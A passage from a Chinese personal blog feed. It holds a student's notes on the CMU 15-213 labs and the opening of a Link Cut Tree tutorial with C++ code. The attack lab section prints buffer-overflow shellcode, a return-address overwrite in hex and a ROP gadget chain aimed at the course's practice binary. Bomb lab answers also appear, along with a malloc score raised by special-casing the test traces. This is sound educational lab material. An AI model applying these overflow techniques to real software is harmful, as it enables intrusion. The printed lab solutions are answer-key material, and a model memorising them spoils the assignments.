class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> nx = !x, ns = nx &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> nnx = !nx, nns = nnx &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">return</span> ((y &lt;&lt; ns) &lt;&lt; ns) | ((z &lt;&lt; nns) &lt;&lt; nns);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> *   O(log log U) operations. </span></span><br><span class="line"><span class="comment"> *   Binary lifting to make most sig bit move toward least sig bit.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> f1 = x  | (x  &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> f2 = f1 | (f1 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> f3 = f2 | (f2 &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">int</span> f4 = f3 | (f3 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> f5 = f4 | (f4 &gt;&gt; <span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> ~f5 &amp; <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> *  Solution with O(log log U) operations. (binary lifting)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="comment">/* Make it positive */</span></span><br><span class="line">    <span class="keyword">int</span> neg = x &gt;&gt; <span class="number">31</span> &amp; <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> pos = !neg;</span><br><span class="line"><span class="keyword">int</span> ce = pos &lt;&lt; <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Make it fit the form of 000...00111..1 */</span></span><br><span class="line">    x = x ^ ((~<span class="number">0</span> &lt;&lt; ce) &lt;&lt; ce);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">2</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">4</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    x = x | (x &gt;&gt; <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* To get proper index */</span></span><br><span class="line">x &lt;&lt;= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Binary lifting to get the answer */</span></span><br><span class="line">    ans = ans + ((x &gt;&gt; (ans + <span class="number">16</span>) &amp; <span class="number">1</span>) &lt;&lt; <span class="number">4</span>);</span><br><span class="line">    ans = ans + ((x &gt;&gt; (ans + <span class="number">8</span>) &amp; <span class="number">1</span>)  &lt;&lt; <span class="number">3</span>);</span><br><span class="line">    ans = ans + ((x &gt;&gt; (ans + <span class="number">4</span>) &amp; <span class="number">1</span>)  &lt;&lt; <span class="number">2</span>);</span><br><span class="line">    ans = ans + ((x &gt;&gt; (ans + <span class="number">2</span>) &amp; <span class="number">1</span>)  &lt;&lt; <span class="number">1</span>);</span><br><span class="line">    ans = ans + ((x &gt;&gt; (ans + <span class="number">1</span>) &amp; <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Bomb-lab"><a href="#Bomb-lab" class="headerlink" title="Bomb lab"></a>Bomb lab</h2><p>耐心读源码就胜利了… 最后一个题是链表排序可还行。由于时间原因没做隐藏关。贴个当时写的题解：</p><ul><li>Phase 1: The program is comparing two strings. The answer string is already there. Use print instruction in gdb to show that.</li><li>Phase 2: The program asks for 6 integers. After reading the assembly code, we can find the answer is a geometric progression with ratio 2 and starting number 1.</li><li>Phase 3: 2 ints. The first should be in some range, and with each of them, we can find corresponding second number in the code. The original program may be just a switch statement.</li><li>Phase 4: 2 unsigned ints. The second one is 0, while the first one is &gt;= 0 and &lt;= 0xe and satisfies that func4(first, 0, first) == 0. func4 is a bit complicated with recursion, so I just bruteforced all of the 15 choices to find the correct value.</li><li>Phase 5: string S of length 6. OK if <code>&#39;&#39;.join(&quot;maduiersnfotvbylSo&quot;[ord(ch) &amp; 0xf] for ch in S) == &quot;flyers&quot;</code></li><li>Phase 6: Input 6 integers, which should be a permutation of 1,2,3,4,5,6. The program firstly transforms it with <code>lambda x: 7-x</code>. Then a new array of pointers is generated. ptr[i] = (address of the node with ID i in the linked list). The node structure is presumably the following, and we need to sort the list in decreasing order of val.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node1</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val, id;</span><br><span class="line">    node1 *nxt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="Attack-lab"><a href="#Attack-lab" class="headerlink" title="Attack lab"></a>Attack lab</h2><p>利用缓冲区溢出，冲掉栈中记录的函数返回地址，从而让程序运行我们想要的函数。</p><p>hack1-1：直接冲掉返回地址就行。</p><p>hack1-2：要让它以指定的参数调用函数。写出如下的汇编，变成机器代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">movl $0x59b997fa,%edi # set cookie</span><br><span class="line">pushq $0x4017ec # call function touch2</span><br><span class="line">ret</span><br><span class="line"># overwrite return address: 0x5561dc78</span><br><span class="line"># hex: bf fa 97 b9 59 68 ec 17 40 00 c3 0c 0d 0e 0f 10 11 12 13 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f 20 21 22 23 24 25 26 27 28 78 dc 61 55 00 00 00 00</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hack1-3：要让它以指定字符串调用。这个挺难，挺卡机器代码长度的。我用的书如下汇编：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">movabsq $0x6166373939623935, %rdi</span><br><span class="line">movq %rdi, -0x400(%rsp)</span><br><span class="line">movl $0, -0x3f8(%rsp)</span><br><span class="line">movl $0x5561d8a8,%edi</span><br><span class="line">pushq $0x4018fa # address of touch3</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"># (0x5561dca0) 0x4  bytes overwrite address -&gt; ???</span><br><span class="line"># 2. When getbuf return: %rsp&#x3D;0x5561dca0 -&gt; 0x5561dca8</span><br><span class="line"># (0x5561dc78) 0x28 bytes for instruction</span><br><span class="line"># 1. getbuf: %rsp&#x3D;0x5561dc78</span><br><span class="line"># 3. Instruction write the following string:</span><br><span class="line"># (0x5561d8a8) 0x9  bytes for string, 0x59b997fa -&gt; 35 39 62 39 39 37 66 61 00</span><br><span class="line"></span><br><span class="line"># WRITE below %rsp to save instructions. Is it valid????</span><br></pre></td></tr></table></figure><p>hack2-1：Return-oriented programming，真是高级的 hack 方式！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Stack:    0x401976, 0x9, 0x402044, 0xf4f4f4f4f4f4f4f4 &lt;repeats 82 times&gt;</span><br><span class="line">#           0x401976, 0x0, 0x9, 0x0, 0x402044, 0x0, 0xf4f4f4f4 &lt;repeats 74 times&gt;</span><br><span class="line"># Change to:0x4019ab,cookie&#x3D;0x59b997fa,0x4019c5,0x4017ec</span><br><span class="line"># &lt;0x4019ab addval_219+4&gt;: 58 90: popq %rax</span><br><span class="line"># &lt;0x4019c5 setval_426+2&gt;: 48 89 c7: movq %rax,%rdi</span><br><span class="line"># &lt;0x4017ec touch2&gt;</span><br></pre></td></tr></table></figure><h2 id="Cache-lab"><a href="#Cache-lab" class="headerlink" title="Cache lab"></a>Cache lab</h2><p>对于我来说最难的 lab？得分 48.4 / 53</p><p>Part A 小模拟，很容易。</p><p>Part B，优化矩阵转置的 Cache miss。每个 cache 块可以存 8 个 int。显然要分块，但是由于只有 1 相连，会有很痛苦的冲突问题… </p><p>61 x 67 由于要求比较低，直接按 16 分块就过了…</p><p>32 x 32 要求也不太高，按 8 分块比 300 稍多一点。优化下对角线，就满分了。</p><p>64 x 64 是真心不会。按 4 分块 + 优化对角线，仍然 1701 miss… 得分 3.4 / 8</p><h2 id="Shell-lab"><a href="#Shell-lab" class="headerlink" title="Shell lab"></a>Shell lab</h2><p>需要综合考虑各种信号处理，挺烧脑，但是不算太难。</p><h2 id="Malloc-lab"><a href="#Malloc-lab" class="headerlink" title="Malloc lab"></a>Malloc lab</h2><p>2 的乘方的 segregated free list + Best fit search 即可 93/100。</p><p>特判了 binary1-bal.rep, binary2-bal.rep 就 98/100 了（逃）</p><p>所以这为啥是大家一致认为的最难的 lab 啊？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000310 18362</span><br><span class="line"> 1       yes  100%    5848  0.000275 21265</span><br><span class="line"> 2       yes   99%    6648  0.000359 18544</span><br><span class="line"> 3       yes  100%    5380  0.000269 20015</span><br><span class="line"> 4       yes   98%   14400  0.000339 42428</span><br><span class="line"> 5       yes   96%    4800  0.000526  9122</span><br><span class="line"> 6       yes   95%    4800  0.000563  8518</span><br><span class="line"> 7       yes   97%    6000  0.003398  1766</span><br><span class="line"> 8       yes   90%    7200  0.004601  1565</span><br><span class="line"> 9       yes  100%   14401  0.000300 48083</span><br><span class="line">10       yes   87%   14401  0.000344 41839</span><br><span class="line">Total          96%   89572  0.011284  7938</span><br><span class="line"></span><br><span class="line">Perf index &#x3D; 58 (util) + 40 (thru) &#x3D; 98&#x2F;100</span><br></pre></td></tr></table></figure><p>Without hard-coded strategy:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Results for mm malloc:</span><br><span class="line">trace  valid  util     ops      secs  Kops</span><br><span class="line"> 0       yes   99%    5694  0.000426 13382</span><br><span class="line"> 1       yes  100%    5848  0.000387 15127</span><br><span class="line"> 2       yes   99%    6648  0.000461 14424</span><br><span class="line"> 3       yes  100%    5380  0.000421 12782</span><br><span class="line"> 4       yes   98%   14400  0.000517 27842</span><br><span class="line"> 5       yes   96%    4800  0.000777  6174</span><br><span class="line"> 6       yes   95%    4800  0.000937  5124</span><br><span class="line"> 7       yes   55%    6000  0.000370 16216</span><br><span class="line"> 8       yes   51%    7200  0.000551 13072</span><br><span class="line"> 9       yes  100%   14401  0.000412 34971</span><br><span class="line">10       yes   87%   14401  0.000422 34101</span><br><span class="line">Total          89%   89572  0.005680 15769</span><br><span class="line"></span><br><span class="line">Perf index &#x3D; 53 (util) + 40 (thru) &#x3D; 93&#x2F;100</span><br></pre></td></tr></table></figure><h2 id="Proxy-lab"><a href="#Proxy-lab" class="headerlink" title="Proxy lab"></a>Proxy lab</h2><p>模拟即可。这个实验挺有用，可以在自己浏览器里跑！但是测试数据很弱……不会检查 file descriptor 泄漏，不会检查 SIGPIPE 的处理之类的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://www.cs.cmu.edu/~213/index.html&quot;&gt;CMU 15-213&lt;/a&gt; 被誉为卡耐基梅隆大学计算机系的“神课”，教材是知名的 Computer Systems: A Programmer’s Perspective（CSAPP，中文译名《深入理解计算机系统》，但不知道“深入”是从哪里来的）。其课程号 15213 恰好也是 CMU 的邮政编码。&lt;/p&gt;
&lt;p&gt;这门课相当于 x86-64 汇编语言、计算机组成原理、操作系统等课程的大杂烩，起到导论作用，是 CMU 计算机大二学生的必修课程。两周刷下来，我感觉这门课最核心的是有趣的实验作业（Lab）。这里我记录一下一些感受和收获。&lt;/p&gt;</summary>
    
    
    
    <category term="公开课" scheme="http://yangdong2002.github.io/categories/%E5%85%AC%E5%BC%80%E8%AF%BE/"/>
    
    
    <category term="计算机系统" scheme="http://yangdong2002.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Link Cut Tree 学习笔记</title>
    <link href="http://yangdong2002.github.io/2020/03/26/Link-Cut-Tree-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yangdong2002.github.io/2020/03/26/Link-Cut-Tree-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-03-26T07:46:56.000Z</published>
    <updated>2020-03-25T17:50:58.902Z</updated>
    
    <content type="html"><![CDATA[<p>加边，删边，询问之中怎料变幻无常；</p><p>左旋，右旋，伸展背后暗含均摊平衡。</p><span id="more"></span><h1 id="LCT-简介"><a href="#LCT-简介" class="headerlink" title="LCT 简介"></a>LCT 简介</h1><p>Link Cut Tree 是解决动态树相关问题的有力工具，其实准确说是维护动态的有根森林，即多棵有根树。它支持在均摊 $O(\log n)$ 的时间对森林进行以下操作：</p><ul><li><code>newnode(x)</code> 新建节点 x，这是个平凡的操作，是 $O(1)$ 的。</li><li><code>link(x, y)</code> 将在不同连通块的节点 <code>x</code> 和 <code>y</code> 之间连边。</li><li><code>cut(x, y)</code> 将 x, y 之间已有的边删掉。</li><li><code>makeRoot(x)</code> 让 x 成为其所在树的根。</li><li><code>pathQuery(x, y)</code> 或 <code>pathModify</code> ，询问 x 到 y 的路径上的有结合律的信息（如路径长度，路径上节点的异或和等可以用线段树维护的信息），或者进行修改。</li></ul><h1 id="LCT-核心操作"><a href="#LCT-核心操作" class="headerlink" title="LCT 核心操作"></a>LCT 核心操作</h1><p>Link Cut Tree 的核心是每个节点记录一个重儿子 (preferred child，应该叫偏爱儿子)，节点到重儿子的边称为重边，相邻的重边形成的叫重链，LCT 要把每个重链以深度为关键字用一棵 Splay 树来维护，而各个 Splay 树之间也存在父子关系，。具体说：</p><p><strong>Auxiliary Tree(辅助树)</strong></p><ul><li><p>由一条重链上的所有节点所构成的 Splay 称作这条链的辅助树</p></li><li><p>每个点的键值为这个点的<strong>深度</strong>，即这棵Splay的中序遍历是这条链从链顶到链底的所有节点构成的序列</p></li><li><p>辅助树的根节点的父亲指向链顶的父亲节点，然而链顶的父亲节点的儿子并不指向辅助树的根节点</p></li><li><p>（也就是说父亲不认轻儿子只认重儿子，儿子都认父亲）</p></li><li><p>这条性质为后来的操作提供了依据</p></li></ul><p><strong>原树与辅助树的关系</strong></p><ul><li>原树中的重链 -&gt; 辅助树中两个节点位于<strong>同一棵Splay</strong>中</li><li>原树中的轻链 -&gt; 辅助树中子节点所在Splay的根节点的father指向父节点</li><li>注意原树与辅助树的结构并不相同</li><li>辅助树的根节点≠原树的根节点</li><li>辅助树中的father≠原树中的father</li></ul><p><strong>辅助树是不断变化的，重链和轻链不断变化</strong></p><p>令每个节点的重儿子 $h_v$ 如下：<br>$$<br>h_v = \begin{cases}v &amp; \text{if }v\text{ is the last accessed vertex in its subtree}\<br>w &amp;\text{if the last accessed vertex in }v \text{ ‘s subtree is in }\&amp;w \text{‘s subtree} \end{cases}<br>$$<br>只要维护上这个，就可以解决上面不涉及换根的所有问题了。</p><p>换根怎么解决呢？</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><div><div class="fold_hider"><div class="close hider_title">点击显示/隐藏代码</div></div><div class="fold"><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author       : YangDavid</span></span><br><span class="line"><span class="comment"> * Created Time : 2020年03月25日 星期三 18时09分40秒</span></span><br><span class="line"><span class="comment"> * Code Time    : 2020年03月25日 星期三 19时32分52秒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rep(i, n) for(int i = 1; i &lt;= n; ++i)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">typedef</span> <span class="built_in">pair</span>&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; pii;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">LCT</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sid(x) ((x) == ch[fa[x]][1])</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nroot(x) ((x) == ch[fa[x]][0] || (x) == ch[fa[x]][1])</span></span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; fa, xorsum, wg, rev;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">array</span>&lt;<span class="keyword">int</span>,2&gt;&gt; ch;</span><br><span class="line">    LCT(<span class="keyword">int</span> n=<span class="number">0</span>): fa(n+<span class="number">1</span>), xorsum(n+<span class="number">1</span>), wg(n+<span class="number">1</span>), rev(n+<span class="number">1</span>), ch(n+<span class="number">1</span>) &#123; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">newnode</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        fa.push_back(<span class="number">0</span>), xorsum.push_back(val), wg.push_back(val);</span><br><span class="line">        rev.push_back(<span class="number">0</span>), ch.push_back(<span class="built_in">array</span>&lt;<span class="keyword">int</span>,<span class="number">2</span>&gt;(&#123;<span class="number">0</span>,<span class="number">0</span>&#125;));</span><br><span class="line">        <span class="keyword">return</span> fa.size() - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">(<span class="keyword">int</span> o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!o) <span class="keyword">return</span>;</span><br><span class="line">        xorsum[o] = xorsum[ch[o][<span class="number">0</span>]] ^ xorsum[ch[o][<span class="number">1</span>]] ^ wg[o];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(o &amp;&amp; rev[o]) &#123;</span><br><span class="line">            swap(ch[o][<span class="number">0</span>], ch[o][<span class="number">1</span>]);</span><br><span class="line">            rev[ch[o][<span class="number">0</span>]] ^= <span class="number">1</span>;</span><br><span class="line">            rev[ch[o][<span class="number">1</span>]] ^= <span class="number">1</span>;</span><br><span class="line">            rev[o] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nroot(x)) update(fa[x]);</span><br><span class="line">        down(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> y = fa[x], z = fa[y], k = sid(x);</span><br><span class="line">        <span class="keyword">if</span>(nroot(y)) ch[z][sid(y)] = x;</span><br><span class="line">        fa[x] = z;</span><br><span class="line">        fa[ch[x][k^<span class="number">1</span>]] = y, ch[y][k] = ch[x][k^<span class="number">1</span>];</span><br><span class="line">        fa[y] = x, ch[x][k^<span class="number">1</span>] = y;</span><br><span class="line">        up(y), up(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">splay</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="comment">// never splay(0)!!!</span></span><br><span class="line">        update(x);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> f = fa[x]; nroot(x); rotate(x), f = fa[x]) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nroot(f)) rotate(sid(x) == sid(f) ? f : x);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">access</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; <span class="comment">// root-to-x path became preferred, x became root.</span></span><br><span class="line">        <span class="keyword">int</span> p = <span class="number">0</span>, ori = x;</span><br><span class="line">        <span class="keyword">for</span>(; x; p = x, x = fa[x])</span><br><span class="line">            splay(x), ch[x][<span class="number">1</span>] = p, up(x);</span><br><span class="line">        splay(ori);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">makeRoot</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        access(x);</span><br><span class="line">        rev[x] ^= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="comment">// root(x) != root(y) must hold!</span></span><br><span class="line">        makeRoot(x);</span><br><span class="line">        fa[x] = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">cut</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123; <span class="comment">// edge must exist!</span></span><br><span class="line">        makeRoot(x);</span><br><span class="line">        access(y);</span><br><span class="line">        ch[y][<span class="number">0</span>] = fa[x] = <span class="number">0</span>;</span><br><span class="line">        up(y);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findRoot</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        access(x);</span><br><span class="line">        <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">            down(x);</span><br><span class="line">            <span class="keyword">if</span>(!ch[x][<span class="number">0</span>]) <span class="keyword">break</span>;</span><br><span class="line">            x = ch[x][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        splay(x);</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        makeRoot(x);</span><br><span class="line">        access(y);</span><br><span class="line">        <span class="keyword">return</span> xorsum[y];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">        access(u);</span><br><span class="line">        wg[u] = w;</span><br><span class="line">        up(u);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, m;</span><br><span class="line">    <span 